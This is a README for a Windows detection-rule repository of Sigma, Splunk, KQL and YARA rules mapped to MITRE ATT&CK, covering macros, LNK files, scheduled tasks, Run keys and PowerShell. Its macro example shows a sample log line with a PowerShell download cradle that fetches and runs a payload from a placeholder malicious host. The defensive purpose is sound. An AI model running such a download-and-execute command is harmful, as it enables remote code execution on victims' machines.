# Detection-Content Repository

**Production-ready detection rules for Windows security operations.**

Sigma rules, Splunk SPL queries, KQL queries, YARA signatures, and documentation for detecting common Windows attack techniques.

---

## 📁 What's Inside

| Folder | Content | Usage |
|--------|---------|-------|
| `sigma/` | 6 Sigma detection rules | Deploy to Splunk, Sentinel, or Chainsaw |
| `splunk/` | Splunk SPL queries | Copy/paste into Splunk search bar |
| `kql/` | Microsoft Sentinel KQL | Copy/paste into KQL editor |
| `yara/` | YARA file signatures | Use with YARA scanner tools |
| `detection_writeups/` | Detailed guides | Understanding each detection |
| `attack_mappings/` | MITRE ATT&CK mappings | Coverage documentation |

---

## 🎯 Quick Reference: What Each Detection Does

### 1️⃣ **Office Macro Execution** (office_macros.yml)
- **Detects:** Word/Excel opening → PowerShell launching
- **Why:** Macro malware downloading payloads
- **Alert Level:** 🔴 HIGH
- **False Positives:** Legitimate Office automation scripts

### 2️⃣ **LNK File Execution** (lnk_file_execution.yml)
- **Detects:** Explorer launching .LNK shortcut files
- **Why:** Malicious shortcuts hiding actual command
- **Alert Level:** 🔴 HIGH
- **False Positives:** Normal Windows shortcut usage

### 3️⃣ **Script Execution from User Folders** (scripts_user_folders.yml)
- **Detects:** PowerShell/VBScript running from Downloads/Desktop/Temp
- **Why:** Downloaded malware being executed
- **Alert Level:** 🔴 HIGH (URGENT)
- **False Positives:** Legitimate software installers

### 4️⃣ **Scheduled Task Creation** (scheduled_task_creation.yml)
- **Detects:** schtasks.exe /create command
- **Why:** Persistence mechanism for reboot survival
- **Alert Level:** 🟠 MEDIUM-HIGH
- **False Positives:** Admin maintenance tasks

### 5️⃣ **Registry Run Keys Modification** (registry_run_keys.yml)
- **Detects:** Registry writes to HKLM/HKCU Run/RunOnce
- **Why:** Persistence at logon
- **Alert Level:** 🟠 MEDIUM-HIGH
- **False Positives:** Software installations

### 6️⃣ **PowerShell Script Block Logging** (powershell_execution.yml)
- **Detects:** PowerShell scripts with IEX, DownloadString, or System.Reflection
- **Why:** Fileless malware and obfuscated payloads
- **Alert Level:** 🔴 HIGH
- **False Positives:** Legitimate admin scripts

---

## 📊 Detection Coverage

| MITRE Technique | Rule | Sigma | SPL | KQL | YARA |
|-----------------|------|-------|-----|-----|------|
| T1566.001 - Phishing | Office Macros | ✅ | ✅ | ✅ | - |
| T1547.009 - Shortcut | LNK Execution | ✅ | ✅ | ✅ | ✅ |
| T1059 - Scripting | Script Execution | ✅ | ✅ | ✅ | - |
| T1053.005 - Scheduled Task | Task Creation | ✅ | ✅ | ✅ | - |
| T1547.001 - Registry | Run Keys Mod | ✅ | ✅ | ✅ | - |
| T1059.001 - PowerShell | PS Execution | ✅ | ✅ | ✅ | - |

---

## 🚀 How to Use

### **In Splunk:**
1. Copy query from `splunk/` folder
2. Paste into search bar
3. Adjust time range
4. Create alert

### **In Microsoft Sentinel:**
1. Copy query from `kql/` folder
2. Paste into KQL editor
3. Click "Run"
4. Create analytics rule

### **With Chainsaw (SIEM-less):**
```bash
chainsaw hunt -s sigma/office_macros.yml -e C:\Windows\System32\winevt\Logs
```

---

## 📖 Documentation

Each detection includes:
- ✅ What it detects
- ✅ Why it matters
- ✅ How to use it
- ✅ What triggers false positives
- ✅ How to tune it

See individual README.md files in each folder.

---

## 🎓 Example: Office Macro Detection

**Scenario:** User opens weaponized Word document with macro

**Detection Logic:**IF (ParentProcess = WINWORD.EXE) AND
(ChildProcess = powershell.exe OR cmd.exe)
THEN ALERT
**What you see in Splunk:**
ComputerName: DESKTOP-USER123
User: john.smith
ParentImage: C:\Program Files\Microsoft Office\WINWORD.EXE
Image: C:\Windows\System32\powershell.exe
CommandLine: powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload')"
**Incident Response:**
1. Isolate computer immediately
2. Collect Office document
3. Check email logs for distribution
4. Monitor network for C2 callbacks

---

**Author:** Solomon James | **Date:** June 2026 | **License:** MIT
